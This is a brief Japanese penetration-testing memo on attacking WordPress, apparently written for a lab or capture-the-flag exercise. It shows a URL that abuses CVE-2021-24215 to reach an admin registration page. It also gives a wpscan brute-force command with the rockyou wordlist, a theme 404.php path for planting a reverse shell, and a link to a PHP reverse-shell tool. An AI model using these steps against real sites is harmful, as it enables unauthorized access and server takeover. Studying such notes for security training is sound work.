# WordPress

core、pluginどちらかの脆弱性となる。両軸で脆弱性の調査をするとよい

### Controlled-admin-access-plugin(CVE-2021-24215)

https://blog.nintechnet.com/vulnerabilities-fixed-in-wordpress-controlled-admin-access-plugin/

```
http://management_portal/wordpress/wp-admin/admin.php?page=%2Fcontrolled_admin_access
```

上記のようなURLでユーザ登録画面にアクセスができる。

### Wpscan

hosts設定をできれば事前にした方がいい

* パスワードリスト攻撃

```
sudo wpscan --url http://management_portal:80/wordpress/ -U access -P /usr/share/wordlists/rockyou.txt
```



#### Themeでのリバースシェル

URL形式

```
http://management_portal/wordpress/wp-content/themes/twentytwenty/404.php
```

リバースシェル

https://github.com/ivan-sincek/php-reverse-shell

↑windowsとlinuxどちらにも対応していてよい

